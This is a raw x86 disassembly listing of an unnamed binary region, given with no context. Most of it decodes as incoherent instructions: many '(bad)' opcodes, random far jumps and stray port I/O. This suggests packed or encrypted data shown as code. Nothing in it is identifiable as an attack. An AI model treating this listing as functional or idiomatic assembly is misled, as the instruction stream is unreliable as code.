  416de9:	ret    0x18fa
  416dec:	cdq    
  416ded:	sbb    edx,ebx
  416def:	mov    edx,0xa50194e2
  416df4:	mov    ah,0xf3
  416df6:	mov    ah,0x2d
  416df8:	add    DWORD PTR [ebx+0x2c],esi
  416dfb:	mov    edi,0x58897ac
  416e00:	pushf  
  416e01:	sub    eax,0xa1a3783d
  416e06:	xchg   edx,eax
  416e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e08:	stc    
  416e09:	icebp  
  416e0a:	push   esp
  416e0b:	aas    
  416e0c:	sub    DWORD PTR [esi],edx
  416e0e:	arpl   bx,di
  416e10:	ja     0x416de0
  416e12:	fst    DWORD PTR [ecx-0x15c5ed26]
  416e18:	mov    dl,0xb8
  416e1a:	icebp  
  416e1b:	outs   dx,BYTE PTR ds:[esi]
  416e1c:	(bad)  
  416e1d:	xor    dl,BYTE PTR [esi]
  416e1f:	or     al,0xfd
  416e21:	mov    edx,0xc80d015
  416e26:	in     eax,dx
  416e27:	ds pop edx
  416e29:	or     cl,BYTE PTR [ebx]
  416e2b:	cmp    DWORD PTR [esi+0x13cab790],eax
  416e31:	fidiv  DWORD PTR [ecx]
  416e33:	bound  ebp,QWORD PTR [eax-0x584796b2]
  416e39:	popa   
  416e3a:	xchg   BYTE PTR [edx-0x5c2db142],ah
  416e40:	stos   BYTE PTR es:[edi],al
  416e41:	ins    DWORD PTR es:[edi],dx
  416e42:	jns    0x416dec
  416e44:	mov    ch,0xca
  416e46:	adc    al,0x76
  416e48:	enter  0x5695,0xd1
  416e4c:	sbb    DWORD PTR [eax+0x2b],eax
  416e4f:	shl    esi,0x70
  416e52:	outs   dx,BYTE PTR ds:[esi]
  416e53:	mov    WORD PTR [edx+0x1a],cs
  416e56:	lea    ecx,[edi]
  416e58:	mov    edi,0x77d4c88d
  416e5d:	pop    ebx
  416e5e:	in     eax,0x11
  416e60:	fnstsw WORD PTR [ebx-0xa]
  416e63:	pop    ds
  416e64:	jo     0x416eb5
  416e66:	sar    BYTE PTR [eax+0x60d3e542],0x8d
  416e6d:	xor    ecx,DWORD PTR [edx+0x2d1a9268]
  416e73:	fbstp  TBYTE PTR [edi]
  416e75:	cli    
  416e76:	adc    DWORD PTR ds:0x8373399e,eax
  416e7c:	mov    BYTE PTR [ecx],dh
  416e7e:	sub    al,0x26
  416e80:	mov    dh,0x6e
  416e82:	mov    ds:0x5f40b15d,al
  416e87:	mov    bh,0xdb
  416e89:	push   eax
  416e8a:	popa   
  416e8b:	test   ch,ch
  416e8d:	mov    DWORD PTR [ebx+0x76],edx
  416e90:	jae    0x416e94
  416e92:	mov    cl,0x79
  416e94:	in     al,0xe8
  416e96:	enter  0x4f45,0x4e
  416e9a:	dec    edx
  416e9b:	hlt    
  416e9c:	stos   DWORD PTR es:[edi],eax
  416e9d:	sub    al,0x91
  416e9f:	ds push eax
  416ea1:	arpl   WORD PTR [ecx+0x5c9721c1],bx
  416ea7:	push   ss
  416ea8:	fiadd  DWORD PTR [eax-0x2e]
  416eab:	sbb    ah,BYTE PTR [ebp+0x7ba73f1c]
  416eb1:	mov    ebx,0xa36a7f2c
  416eb6:	(bad)  
  416eb7:	mov    eax,0x3a91fbeb
  416ebc:	sub    DWORD PTR [edi],eax
  416ebe:	into   
  416ebf:	int    0xf0
  416ec1:	nop
  416ec2:	jmp    0x416e57
  416ec4:	adc    eax,0xf93ffeb2
  416ec9:	mov    DWORD PTR [ebx+0x2b05d271],ebx
  416ecf:	cld    
  416ed0:	test   eax,0x6b4cb490
  416ed5:	or     ch,BYTE PTR [ebx]
  416ed7:	nop
  416ed8:	fstp   TBYTE PTR [eax+ecx*2]
  416edb:	mov    al,ds:0xdbd90608
  416ee0:	rol    DWORD PTR [eax-0x41],cl
  416ee3:	cli    
  416ee4:	mov    bl,cl
  416ee6:	push   ebp
  416ee7:	test   al,0x64
  416ee9:	mov    dl,0x18
  416eeb:	sahf   
  416eec:	push   es
  416eed:	cmp    al,0x51
  416eef:	add    al,0x6c
  416ef1:	xor    bh,ah
  416ef3:	adc    DWORD PTR [esi],esp
  416ef5:	jnp    0x416ee9
  416ef7:	mov    ds:0xfcc80f10,eax
  416efc:	loop   0x416ecf
  416efe:	inc    edi
  416eff:	mov    edx,0x97e2136a
  416f04:	call   0x184f:0xeda7d939
  416f0b:	cmp    BYTE PTR [ecx],dl
  416f0d:	cld    
  416f0e:	gs sbb eax,0x206b8c0e
  416f14:	sub    DWORD PTR [eax+0x2b],ebp
  416f17:	enter  0xbd6,0x47
  416f1b:	lods   eax,DWORD PTR ds:[esi]
  416f1c:	les    esi,FWORD PTR ds:[edx]
  416f1f:	stc    
  416f20:	test   BYTE PTR [ebx],bh
  416f22:	adc    ebp,DWORD PTR [ebp+0x177a2a45]
  416f28:	test   BYTE PTR [esi+0x35bdb57],cl
  416f2e:	xor    esi,DWORD PTR [edi-0x15]
  416f31:	jmp    0xed86:0x1968aed0
  416f38:	or     DWORD PTR [esi],eax
  416f3a:	mov    al,ds:0xe6ed2b94
  416f3f:	cmp    esi,0x89b0c3d
  416f45:	lds    esi,FWORD PTR [ecx+0x207f45a6]
  416f4b:	sbb    al,BYTE PTR [ecx]
  416f4d:	cwde   
  416f4e:	inc    edx
  416f4f:	loope  0x416eff
  416f51:	arpl   WORD PTR [eax],dx
  416f53:	jmp    0x4a8585ae
  416f58:	adc    DWORD PTR [edi-0x4b],edx
  416f5b:	shl    BYTE PTR [ebp+0x30],0xf5
  416f5f:	jecxz  0x416fca
  416f61:	pop    ds
  416f62:	adc    DWORD PTR ds:0xf384379f,edx
  416f68:	pop    ebx
  416f69:	shl    cl,1
  416f6b:	ret    
  416f6c:	je     0x416faa
  416f6e:	pop    ebp
  416f6f:	and    esi,edi
  416f71:	pop    ss
  416f72:	fistp  DWORD PTR [ecx]
  416f74:	call   0xcdc0ffe6
  416f79:	fcom   st(3)
  416f7b:	dec    edi
  416f7c:	sbb    al,0x35
  416f7e:	mov    dh,0xaa
  416f80:	dec    esp
  416f81:	xor    eax,0xd0d5c14f
  416f86:	or     ah,BYTE PTR [ebp+ebp*4-0x578429cb]
  416f8d:	int    0xf4
  416f8f:	mov    dl,0xea
  416f91:	imul   edx,DWORD PTR [eax-0x4d],0xe1829b03
  416f98:	imul   esp,DWORD PTR [ecx+eiz*8-0x35051db6],0xffffffa4
  416fa0:	fist   DWORD PTR [ebp-0x4afe0cce]
  416fa6:	or     eax,0x4631057f
  416fab:	mov    ebx,0xbcacae9b
  416fb0:	jmp    0x416f7b
  416fb2:	sbb    eax,0xf7fb7aff
  416fb7:	mov    eax,0x72060950
  416fbc:	or     edx,ebx
  416fbe:	xor    al,0x0
  416fc0:	mov    WORD PTR [ecx-0x2b],?
  416fc3:	test   BYTE PTR ds:0xed67f664,0xd2
  416fca:	dec    edx
  416fcb:	ss or  eax,eax
  416fce:	outs   dx,BYTE PTR cs:[esi]
  416fd0:	std    
  416fd1:	iret   
  416fd2:	repz shl dl,cl
  416fd5:	sub    ch,ch
  416fd7:	add    ch,ch
  416fd9:	lods   al,BYTE PTR ds:[esi]
  416fda:	daa    
  416fdb:	mov    ebp,0xf9ec13a3
  416fe0:	sub    DWORD PTR [esp+esi*8+0x63],ecx
  416fe4:	imul   esi,DWORD PTR [ecx+0x4b],0xffffffd7
  416fe8:	sahf   
  416fe9:	test   BYTE PTR [esi],cl
  416feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fec:	retf   
  416fed:	xor    al,0x36
  416ff0:	(bad)  
  416ff1:	sub    eax,0x8318d247
  416ff6:	stc    
  416ff7:	push   eax
  416ff8:	out    dx,eax
  416ff9:	xor    BYTE PTR [ebx-0x2b],dl
  416ffc:	mov    al,0x30
  416ffe:	out    0x6c,al
  417000:	mov    cl,0x84
  417002:	retf   
  417003:	cs retf 
  417005:	(bad)  
  417006:	std    
  417007:	mov    ds:0x55f74235,eax
  41700c:	(bad)  
  41700d:	add    ebp,edx
  41700f:	jmp    0x4068:0xcce10d01
  417016:	jmp    0xfdfb:0xa44ee69c
  41701d:	sub    eax,0xa65b16e2
  417022:	and    al,0x8
  417024:	sub    eax,0xd6a24c76
  417029:	push   cs
  41702a:	and    DWORD PTR [edx],ecx
  41702c:	enter  0x4305,0xd3
  417030:	repnz pop ebx
  417032:	push   esp
  417033:	jp     0x41708c
  417035:	push   ds
  417036:	lock mov al,ds:0x6a72eb5c
  41703c:	mov    dh,0xda
  41703e:	or     esp,ecx
  417040:	mov    dl,0x57
  417042:	jmp    0xf295:0x438b
  417048:	push   esi
  417049:	outs   dx,BYTE PTR ds:[esi]
  41704a:	(bad)  ds:0x5dd1b8c6
  417050:	xlat   BYTE PTR ds:[ebx]
  417051:	outs   dx,DWORD PTR ds:[esi]
  417052:	add    ebx,edi
  417054:	loop   0x4170a1
  417056:	and    DWORD PTR [ebx-0x21],ecx
  417059:	pop    ebp
  41705a:	stos   BYTE PTR es:[edi],al
  41705b:	shl    DWORD PTR [esi+0x5caae5c5],1
  417061:	outs   dx,BYTE PTR ds:[esi]
  417062:	adc    ah,BYTE PTR [edx+eiz*2+0x69b27177]
  417069:	push   esi
  41706a:	or     BYTE PTR [edi+0x79],ch
  41706d:	pop    edx
  41706e:	jne    0x41701d
  417070:	retf   0x3189
  417073:	dec    ebp
  417074:	loop   0x41706a
  417076:	sbb    eax,0x848e25f1
  41707b:	cs (bad) 
  41707d:	mov    ss:0x2d613b5e,al
  417083:	mov    ds:0x55f07b74,al
  417088:	(bad)  
  417089:	cmp    al,0xbc
  41708b:	clc    
  41708c:	enter  0xdb01,0x5c
  417090:	out    0x15,eax
  417092:	or     dl,BYTE PTR [ebx-0x55]
  417095:	adc    DWORD PTR [ebp+0x71],ebp
  417098:	pop    esi
  417099:	cld    
  41709a:	mov    edx,DWORD PTR [ebp+eax*8+0x2c]
  41709e:	and    al,0x80
  4170a0:	lock push es
  4170a2:	pop    esi
  4170a3:	sbb    eax,0x8c655714
  4170a8:	std    
  4170a9:	xchg   ecx,eax
  4170aa:	pusha  
  4170ab:	mov    cl,0x2
  4170ad:	mov    ebx,0x765becfc
  4170b2:	fprem  
  4170b4:	std    
  4170b5:	and    ah,BYTE PTR [esi-0x5a]
  4170b8:	inc    BYTE PTR [eax]
  4170ba:	xor    esp,ecx
  4170bc:	jmp    0x417074
  4170be:	xchg   BYTE PTR [ebx+0x609fa7d0],ch
  4170c4:	mov    ecx,0x5aece1b3
  4170c9:	cmc    
  4170ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170cb:	mov    ch,0xba
  4170cd:	pop    ebx
  4170ce:	xor    eax,0x99819696
  4170d3:	(bad)  
  4170d4:	cwde   
  4170d5:	ret    0x364b
  4170d8:	into   
  4170d9:	int    0x20
  4170db:	mov    esp,0xfd329037
  4170e0:	cmp    esp,DWORD PTR [ebx+esi*4-0x18]
  4170e4:	sub    ebx,ebx
  4170e6:	xchg   ebx,eax
  4170e7:	(bad)  
  4170e8:	lock mov ebp,0xb6ae0db0
  4170ee:	cld    
  4170ef:	or     ah,dh
  4170f1:	retf   
  4170f2:	inc    esi
  4170f3:	stos   DWORD PTR es:[edi],eax
  4170f4:	and    ebp,ebx
  4170f6:	sub    dl,BYTE PTR [ebx]
  4170f8:	adc    DWORD PTR [eax+ebp*4-0x1e],edi
  4170fc:	cmp    DWORD PTR [ebp-0x1467bfa0],edi
  417102:	mov    ds:0xb24865f5,al
  417107:	daa    
  417108:	sub    eax,0xe08d018a
  41710d:	rol    BYTE PTR [ebx+0x46],cl
  417110:	pop    ecx
  417111:	not    DWORD PTR [ecx]
  417113:	outs   dx,BYTE PTR ds:[esi]
  417114:	sbb    eax,DWORD PTR [edx+0x49]
  417117:	daa    
  417118:	aad    0xd8
  41711a:	gs or  eax,0xd0f83071
  417120:	push   ecx
  417121:	mov    bh,0x89
  417123:	stc    
  417124:	xchg   edx,eax
  417125:	sbb    eax,0x3ab2a6c6
  41712a:	sub    al,0xd8
  41712c:	int3   
  41712d:	shl    DWORD PTR [ecx-0x1483b7a6],1
  417133:	jg     0x4170bc
  417135:	imul   ebp,esp,0x46
  417138:	mov    esp,0x82d436c1
  41713d:	and    ecx,DWORD PTR [ecx+0x10583c2a]
  417143:	push   eax
  417144:	(bad)  
  417145:	push   edi
  417146:	push   esi
  417147:	daa    
  417148:	jno    0x41719f
  41714a:	bound  esi,QWORD PTR [eax-0x21477c3e]
  417150:	push   ds
  417151:	and    eax,0x56188574
  417156:	sub    bh,BYTE PTR [edx+edi*4-0x6d]
  41715a:	pop    ds
  41715b:	jp     0x417144
  41715d:	xor    DWORD PTR [edx],esi
  41715f:	or     al,0x24
  417161:	lahf   
  417162:	push   esi
  417163:	in     al,0x75
  417165:	adc    DWORD PTR [ebx+0xbed4493],eax
  41716b:	js     0x417199
  41716d:	inc    esi
  41716e:	xor    edi,ebp
  417170:	iret   
  417171:	jb     0x417136
  417173:	mov    esi,0xfd949332
  417178:	bound  eax,QWORD PTR [edx-0x50]
  41717b:	inc    eax
  41717c:	cmp    eax,0xca15ee28
  417181:	aad    0x74
  417183:	sbb    dh,ah
  417185:	mov    edx,0xc24b7356
  41718a:	xchg   edi,eax
  41718b:	pop    ebp
  41718c:	xor    BYTE PTR [eax],bl
  41718e:	clc    
  41718f:	fidiv  DWORD PTR [eax+0x6d]
  417192:	mov    ds,WORD PTR [ebx]
  417194:	je     0x41711d
  417196:	cli    
  417197:	xchg   esi,eax
  417198:	imul   ecx,DWORD PTR [edi],0xffffffa1
  41719b:	enter  0x1fa2,0xe9
  41719f:	jbe    0x41713c
  4171a1:	retf   0x5375
  4171a4:	jnp    0x4171fb
  4171a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171a7:	mov    esi,0x5e7c7350
  4171ac:	popa   
  4171ad:	push   es
  4171ae:	add    esp,eax
  4171b0:	call   DWORD PTR [edx+0x45]
  4171b3:	js     0x4171ab
  4171b5:	paddsb mm0,QWORD PTR [edi-0x589c2ade]
  4171bc:	push   edi
  4171bd:	pop    eax
  4171be:	sub    bh,ah
  4171c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171c1:	aam    0x2
  4171c3:	mov    bl,0x5a
  4171c5:	xor    eax,0xd4881f3b
  4171ca:	jl     0x417227
  4171cc:	sub    cl,ah
  4171ce:	xchg   esp,eax
  4171cf:	mov    edx,0xa2e404d6
  4171d4:	push   0x9ee9e070
  4171d9:	fsubp  st(2),st
  4171db:	xor    ah,BYTE PTR [ebp+0x7243cafc]
  4171e1:	cmp    eax,0x1b0ce433
  4171e6:	adc    edi,DWORD PTR [ecx-0x10]
  4171e9:	icebp  
  4171ea:	sbb    dh,dh
  4171ec:	push   es
  4171ed:	addr16 xchg ebx,eax
  4171ef:	pushf  
  4171f0:	sub    DWORD PTR [ebx-0x457cb049],0xe853472d
  4171fa:	aas    
  4171fb:	xlat   BYTE PTR ds:[ebx]
  4171fc:	jbe    0x417235
  4171fe:	inc    edx
  4171ff:	cmp    eax,0x6837c398
  417204:	sub    eax,0xb1b6ce17
  417209:	inc    edi
  41720a:	cdq    
  41720b:	rcl    dh,1
  41720d:	sbb    edx,DWORD PTR [ebp-0x461ea73c]
  417213:	clc    
  417214:	add    DWORD PTR [ebx-0x537f4582],edx
  41721a:	mov    ebx,0x208f7db2
  41721f:	lock stos DWORD PTR es:[edi],eax
  417221:	sahf   
  417222:	add    dl,dh
  417224:	sub    eax,0xe90a463b
  417229:	loop   0x4171f6
  41722b:	xor    DWORD PTR [eax+eax*2+0x70],0xffffff83
  417230:	lods   al,BYTE PTR ds:[esi]
  417231:	repnz pop eax
  417233:	shl    BYTE PTR [esi-0x29],cl
  417236:	push   ebx
  417237:	in     al,0x29
  417239:	jp     0x41726e
  41723b:	je     0x417245
  41723d:	jmp    0x417249
  41723f:	and    BYTE PTR [ecx-0x1641766],bh
  417245:	cwde   
  417246:	xor    eax,0xd6a8097a
  41724b:	loopne 0x417280
  41724d:	sbb    DWORD PTR [ebx-0x4e],edi
  417250:	mov    cl,cl
  417252:	jno    0x4171e0
  417254:	adc    cl,BYTE PTR [esi-0x2bc6931d]
  41725a:	aad    0xe6
  41725c:	aam    0x62
  41725e:	aaa    
  41725f:	xchg   eax,esp
  417261:	fbld   TBYTE PTR [edx]
  417263:	mov    ss,WORD PTR [ebp+0x1f]
  417266:	sub    ch,BYTE PTR [esi+0x67]
  417269:	aam    0x75
  41726b:	ins    BYTE PTR es:[edi],dx
  41726c:	cdq    
  41726d:	mov    ah,0x93
  41726f:	mov    edi,0x2388d46d
  417274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417275:	aaa    
  417276:	xchg   dl,dh
  417278:	dec    eax
  417279:	ret    0xed67
  41727c:	fwait
  41727d:	test   bl,bl
  41727f:	int3   
  417280:	std    
  417281:	jge    0x417229
  417283:	jmp    ebx
  417285:	push   cs
  417286:	dec    ecx
  417287:	loope  0x41724f
  417289:	add    al,0xda
  41728b:	ins    BYTE PTR es:[edi],dx
  41728c:	mov    ecx,?
  41728e:	and    al,0x21
  417290:	add    eax,0xecf21c0c
  417295:	ss sti 
  417297:	mov    DWORD PTR gs:[ecx-0x6cc1ffe7],esi
  41729e:	aas    
  41729f:	out    dx,eax
  4172a0:	(bad)  
  4172a1:	aas    
  4172a2:	inc    ebx
  4172a3:	mov    ebp,0x6cf9756e
  4172a8:	(bad)  
  4172a9:	ins    DWORD PTR es:[edi],dx
  4172aa:	mov    al,ds:0xacd49c19
  4172af:	jmp    edx
  4172b1:	adc    al,0x7e
  4172b3:	jo     0x417322
  4172b5:	mov    esi,0xee78521d
  4172ba:	hlt    
  4172bb:	push   esi
  4172bc:	pop    ebp
  4172bd:	sub    eax,0xaafee091
  4172c2:	ja     0x417264
  4172c4:	shl    DWORD PTR [esi-0x2e88295e],0x13
  4172cb:	sti    
  4172cc:	cmp    ecx,DWORD PTR [ecx-0x65]
  4172cf:	test   al,0xf5
  4172d1:	retf   
  4172d2:	mov    al,ds:0xe749a179
  4172d7:	mov    ds:0x3174517e,al
  4172dc:	test   al,0x10
  4172de:	cmp    eax,0xb4798edd
  4172e3:	add    al,0x9
  4172e5:	push   ebx
  4172e6:	ds out 0xc8,al
  4172e9:	mov    WORD PTR [edx-0x9],gs
  4172ec:	div    BYTE PTR [ebp+0x1]
  4172ef:	in     eax,0x5
  4172f1:	and    ecx,ebx
  4172f3:	fstp   DWORD PTR [eax]
  4172f5:	sub    cl,BYTE PTR [edi-0x37ab7752]
  4172fb:	cdq    
  4172fc:	cdq    
  4172fd:	ja     0x417343
  4172ff:	or     cl,BYTE PTR [edx+0x2849508f]
  417305:	adc    DWORD PTR [ebx-0x18],ebp
  417308:	mov    ebx,0xc1996161
  41730d:	sbb    edx,edi
  41730f:	mov    al,0x89
  417311:	outs   dx,DWORD PTR ds:[esi]
  417312:	dec    ebp
  417313:	xchg   BYTE PTR [esi-0x44],dl
  417316:	test   al,0xbe
  417318:	repnz imul esi,esi,0x9514743b
  41731f:	sbb    dh,BYTE PTR [eax]
  417321:	cmp    eax,DWORD PTR [edi+0x723c375a]
  417327:	scas   eax,DWORD PTR es:[edi]
  417328:	das    
  417329:	cdq    
  41732a:	inc    edi
  41732b:	int    0x70
  41732d:	and    BYTE PTR [edx],bl
  41732f:	mov    ch,0x96
  417331:	xlat   BYTE PTR ds:[ebx]
  417332:	pop    ecx
  417333:	jne    0x417388
  417335:	loope  0x4173ad
  417337:	bound  esi,QWORD PTR [ebx-0x3bd5911a]
  41733d:	js     0x417314
  41733f:	xchg   BYTE PTR [edi-0x6647923d],ch
  417345:	pop    ebx
  417346:	pop    ebp
  417347:	or     DWORD PTR ds:0x537ad015,esp
  41734d:	pop    ss
  41734e:	(bad)  
  41734f:	lods   eax,DWORD PTR ds:[esi]
  417350:	or     al,BYTE PTR [ebx*1+0x44ac1f69]
  417357:	in     al,dx
  417358:	mov    esp,0xf5003353
  41735d:	mov    ch,0xfa
  41735f:	call   0x76e441bd
  417364:	adc    ecx,DWORD PTR [ebx]
  417366:	test   al,0x6a
  417368:	sbb    eax,0x3061748f
  41736d:	xchg   ebx,eax
  41736e:	xchg   esp,eax
  41736f:	test   al,0x91
  417371:	push   edi
  417372:	or     edi,DWORD PTR [edx+0x2e]
  417375:	outs   dx,DWORD PTR ds:[esi]
  417376:	ror    BYTE PTR [esi-0x7],cl
  417379:	lea    ecx,[edi]
  41737b:	iret   
  41737c:	sub    BYTE PTR [ebx-0x58],al
  41737f:	out    dx,al
  417380:	icebp  
  417381:	and    al,0x54
  417383:	loope  0x41738a
  417385:	sbb    al,0x80
  417387:	ss hlt 
  417389:	adc    al,al
  41738b:	in     eax,0xc7
  41738d:	clc    
  41738e:	xor    eax,0x708e84cb
  417393:	sbb    DWORD PTR [edi-0x78],ebx
  417396:	sub    eax,DWORD PTR [eax+0x6011b0ae]
  41739c:	cmp    ebx,DWORD PTR [eax]
  41739e:	mov    ?,WORD PTR [edi+0x4ff1e188]
  4173a4:	gs xchg ecx,eax
  4173a6:	les    ecx,FWORD PTR [eax+0x725e6eaa]
  4173ac:	push   ebp
  4173ad:	pop    es
  4173ae:	ret    0xf9a6
  4173b1:	enter  0xe2f,0x53
  4173b5:	out    dx,eax
  4173b6:	xchg   ebx,eax
  4173b7:	push   eax
  4173b8:	mov    dl,0xff
  4173ba:	fild   DWORD PTR [edi+0x492a07e8]
  4173c0:	pusha  
  4173c1:	out    0x2f,al
  4173c3:	mov    edi,0x86fa5125
  4173c8:	repz mov esi,0xbfc383f2
  4173ce:	mov    edx,0x5513fd16
  4173d3:	je     0x4173a0
  4173d5:	les    edi,FWORD PTR [edi]
  4173d7:	inc    esi
  4173d8:	sahf   
  4173d9:	or     al,0x34
  4173db:	test   ch,al
  4173dd:	jmp    0x6228:0x37b1fd84
  4173e4:	daa    
  4173e5:	jl     0x41742a
  4173e7:	out    0x37,al
  4173e9:	(bad)  [edi-0x2f]
  4173ec:	mov    cl,0xa3
  4173ee:	xor    eax,DWORD PTR [esi+0x12]
  4173f1:	mov    esi,0x9c63b9d4
  4173f6:	adc    DWORD PTR [ecx+ecx*4-0x12165dc7],esi
  4173fd:	fs jmp 0xb9c31e75
  417403:	imul   ebx,DWORD PTR [ebp+0xb],0x86d5ecba
  41740a:	loop   0x417433
  41740c:	clc    
  41740d:	push   cs
  41740e:	leave  
  41740f:	xor    al,0xd
  417411:	mov    BYTE PTR [edi+0x45],bl
  417414:	test   DWORD PTR [ecx-0x766ae31c],edi
  41741a:	sub    ebx,DWORD PTR [esi+eiz*1+0x11feccd2]
  417421:	pop    edx
  417422:	adc    DWORD PTR [esi+0x2],edx
  417425:	inc    ebx
  417426:	mov    bh,0xba
  417428:	iret   
  417429:	jb     0x41748d
  41742b:	mov    dl,0xa4
  41742d:	aas    
  41742e:	dec    ecx
  41742f:	aaa    
  417430:	mov    dl,0xbe
  417432:	cs retf 0x4358
  417436:	mov    ebp,ds
  417438:	dec    edx
  417439:	xor    al,0xf3
  41743b:	cld    
  41743c:	pop    ebx
  41743d:	adc    BYTE PTR [ebx+0x335798a2],al
  417443:	loopne 0x41745d
  417445:	and    dl,BYTE PTR [edx+0x2a]
  417448:	or     esi,esi
  41744a:	sub    cl,BYTE PTR [esi]
  41744c:	call   0xdb6e:0xe9394ac3
  417453:	jbe    0x4174b8
  417455:	das    
  417456:	repz sub ebp,ebx
  417459:	lods   eax,DWORD PTR ds:[esi]
  41745a:	stos   DWORD PTR es:[edi],eax
  41745b:	sti    
  41745c:	addr16 js 0x34233835
  417463:	xchg   bl,ch
  417465:	or     BYTE PTR [esi-0x15],0x7f
  417469:	dec    ebx
  41746a:	jne    0x417474
  41746c:	jmp    0x417440
  41746e:	dec    ebp
  41746f:	stc    
  417470:	jae    0x417480
  417472:	fneni(8087 only) 
  417474:	aaa    
  417475:	sbb    dl,dh
  417477:	(bad)
  41747c:	pushf  
  41747d:	aaa    
  41747e:	push   eax
  41747f:	mov    eax,0x4aaa3a39
  417484:	bound  ebx,QWORD PTR [ecx+0x2a]
  417487:	hlt    
  417488:	cwde   
  417489:	stc    
  41748a:	sbb    BYTE PTR [ecx],ch
  41748c:	mov    ebx,DWORD PTR [ebp+eax*8-0x1ee9fd20]
  417493:	sub    eax,0x7a838ba6
  417498:	ds xchg esp,eax
  41749a:	test   al,0x3a
  41749c:	xchg   ebx,eax
  41749d:	popa   
  41749e:	xor    BYTE PTR [ecx],bl
  4174a0:	mov    DWORD PTR ds:0x5c323237,edx
  4174a6:	jle    0x417456
  4174a8:	(bad)  
  4174a9:	jbe    0x417432
  4174ab:	jae    0x417482
  4174ad:	push   ecx
  4174ae:	rcl    DWORD PTR [ebp-0x48],0x98
  4174b2:	bound  ecx,QWORD PTR ds:0x80700296
  4174b8:	jno    0x417482
  4174ba:	fist   DWORD PTR [edi+eiz*2+0x36]
  4174be:	push   ebp
  4174bf:	fcmovne st,st(1)
  4174c1:	mov    eax,0xed086923
  4174c6:	dec    edi
  4174c7:	jmp    0x820fe2c7
  4174cc:	mov    ebx,0x92ec3c84
  4174d1:	sub    eax,0xef3d146c
  4174d6:	test   BYTE PTR es:[edx],0x1a
  4174da:	std    
  4174db:	nop    DWORD PTR ds:0x18ed4711
  4174e2:	mov    ah,0x3a
  4174e4:	leave  
  4174e5:	int3   
  4174e6:	shl    bl,1
  4174e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174e9:	push   cs
  4174ea:	(bad)  
  4174eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174ec:	xor    al,0x75
  4174ee:	lds    edi,FWORD PTR [ecx+0x263261da]
  4174f4:	div    BYTE PTR [ecx+0x6d68cfaa]
  4174fa:	add    ecx,DWORD PTR ds:0xa4108d0b
  417500:	cli    
  417501:	dec    edx
  417502:	ins    DWORD PTR es:[edi],dx
  417503:	shr    ecx,0x9e
  417506:	xchg   edx,eax
  417507:	scas   eax,DWORD PTR es:[edi]
  417508:	inc    DWORD PTR ds:0x656d219
  41750e:	ds xchg esp,eax
  417510:	sbb    ebx,0x36744d5e
  417516:	pop    ebp
  417517:	out    0x8d,eax
  417519:	pop    ebx
  41751a:	ret    0x90b
  41751d:	xor    eax,0xa1081ac4
  417522:	ret    0x1ba0
  417525:	fistp  QWORD PTR [ecx]
  417527:	fsubr  QWORD PTR [ebp-0x4b1e3761]
  41752d:	(bad)  
  41752e:	mov    eax,0xac053288
  417533:	push   esp
  417534:	xlat   BYTE PTR ds:[ebx]
  417535:	or     BYTE PTR [ecx-0x2b9159d4],ch
  41753b:	scas   al,BYTE PTR es:[edi]
  41753c:	push   ebp
  41753d:	fisubr WORD PTR [ebp-0x4e2cdc36]
  417543:	fcmovnbe st,st(3)
  417545:	inc    esi
  417546:	sbb    al,0x6
  417548:	pushf  
  417549:	sub    BYTE PTR [eax-0x2b],bl
  41754c:	aam    0x50
  41754e:	out    dx,eax
  41754f:	dec    edx
  417550:	pop    edx
  417551:	idiv   DWORD PTR [ebx+0x4bed0ec1]
  417557:	pop    esi
  417558:	daa    
  417559:	out    0x8a,eax
  41755b:	(bad)  
  41755c:	jnp    0x417565
  41755e:	inc    eax
  41755f:	mov    al,0xba
  417561:	sbb    al,0x5d
  417563:	and    bl,bh
  417565:	fsub   st(5),st
  417567:	ins    DWORD PTR es:[edi],dx
  417568:	das    
  417569:	mov    ah,0x2b
  41756b:	sahf   
  41756c:	dec    esp
  41756d:	div    DWORD PTR [edi-0x30]
  417570:	push   0x67
  417572:	imul   ebp,DWORD PTR [edi-0x757bf376],0xfffffff3
  417579:	repz cmp ecx,DWORD PTR [edi+eax*2]
  41757d:	fsub   DWORD PTR [ebp+0x4445a52]
  417583:	or     BYTE PTR [edi-0x36],ah
  417586:	cmp    eax,0xebce32b8
  41758b:	iret   
  41758c:	ja     0x4175ea
  41758e:	dec    ebx
  41758f:	stos   BYTE PTR es:[edi],al
  417590:	jge    0x417604
  417592:	stos   BYTE PTR es:[edi],al
  417593:	in     eax,dx
  417594:	movlhps xmm1,xmm6
  417597:	pop    esi
  417598:	dec    edi
  417599:	inc    edi
  41759a:	and    al,0xf1
  41759c:	loope  0x41756f
  41759e:	sub    bh,bh
  4175a0:	pop    ecx
  4175a1:	sub    al,0x72
  4175a3:	sti    
  4175a4:	inc    edi
  4175a5:	scas   al,BYTE PTR es:[edi]
  4175a6:	sti    
  4175a7:	test   BYTE PTR [edi-0x37d4d5c1],0x5
  4175ae:	xchg   edi,eax
  4175af:	in     eax,0x61
  4175b1:	imul   ecx,eax,0x845b36fe
  4175b7:	mov    dl,0x79
  4175b9:	lahf   
  4175ba:	out    0xaf,eax
  4175bc:	jnp    0x4175dd
  4175be:	outs   dx,BYTE PTR ds:[esi]
  4175bf:	push   ds
  4175c0:	mov    ch,0x29
  4175c2:	popf   
  4175c3:	popa   
  4175c4:	test   BYTE PTR [ebx],0xd0
  4175c7:	push   eax
  4175c8:	mov    cl,0x6c
  4175ca:	iret   
  4175cb:	xor    al,0xe0
  4175cd:	inc    ebp
  4175ce:	push   eax
  4175cf:	sahf   
  4175d0:	scas   al,BYTE PTR es:[edi]
  4175d1:	ds call 0x1f8:0x6f98683b
  4175d9:	(bad)  
  4175da:	pop    ebp
  4175db:	or     al,0x8c
  4175dd:	je     0x417650
  4175df:	(bad)  
  4175e0:	mov    ecx,0x96e414f1
  4175e5:	and    BYTE PTR [ebp-0x4967cdfe],dl
  4175eb:	scas   al,BYTE PTR es:[edi]
  4175ec:	mov    ?,WORD PTR [edi]
  4175ee:	loopne 0x417575
  4175f0:	pop    ebp
  4175f1:	add    DWORD PTR [ecx],eax
